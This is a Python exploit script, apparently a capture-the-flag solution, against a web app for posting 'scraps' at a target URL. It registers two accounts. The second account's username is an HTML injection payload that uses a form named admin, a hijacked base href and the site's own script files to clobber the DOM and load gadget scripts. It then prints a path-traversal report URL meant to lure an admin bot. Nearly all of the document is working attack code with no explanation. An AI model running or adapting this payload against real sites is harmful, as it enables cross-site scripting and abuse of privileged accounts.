import urllib.request
import urllib.parse
import secrets
import re
import os

ENDPOINT = os.environ["TARGET_URL"]

class NoRedirectHandler(urllib.request.HTTPRedirectHandler):
    def http_error_302(self, req, fp, code, msg, headers):
        infourl = urllib.request.addinfourl(fp, headers, req.get_full_url())
        infourl.status = code
        infourl.code = code
        return infourl
    http_error_300 = http_error_302
    http_error_301 = http_error_302
    http_error_303 = http_error_302
    http_error_307 = http_error_302

opener = urllib.request.build_opener(NoRedirectHandler())
urllib.request.install_opener(opener)

def post(path, data, headers = {}):
    headers['Content-Type'] = 'application/x-www-form-urlencoded'
    req = urllib.request.Request(ENDPOINT + path, data.encode(), headers)
    return urllib.request.urlopen(req)

def register(name, password):
    data = {
        'name': name,
        'password': password
    }
    return post('/register', urllib.parse.urlencode(data))

def login(name, password):
    data = {
        'name': name,
        'password': password
    }
    res = post('/login', urllib.parse.urlencode(data))
    return res.headers['Set-Cookie']

def register_and_login(name, password):
    register(name, password)
    cookie = login(name, password)
    print('register and login as {}'.format(name))
    return cookie

def create_scrap(session, title, body):
    data = {
        'title': title,
        'body': body
    }
    res = post('/new', urllib.parse.urlencode(data), {
        'Cookie': session
    })
    return res.headers['Location']

user1 = 'hoge' + str(secrets.randbits(32))
user1_title = str(secrets.randbits(16))
user1_body = user1_title
user1_cookie = register_and_login(user1, user1)
user1_scrap = create_scrap(user1_cookie, user1_title, user1_body)
user1_id = re.search('/scraps\/(\w+)/', user1_scrap).group(1)

user2 = '<form name=admin id={}><base href=/static/javascripts/><script src=load-scrap.js></script><script src=report-scrap.js></script><script src=periodically-watch-scrap-body-and-report-scrap-automatically-with-banword.js></script><!--'.format(user1_id)
user2_title = str(secrets.randbits(16))
user2_body = user2_title
user2_cookie = register_and_login(user2, user2)
user2_scrap = create_scrap(user2_cookie, user2_title, user2_body)

print('report {}{}#/../..'.format(ENDPOINT, user2_scrap))
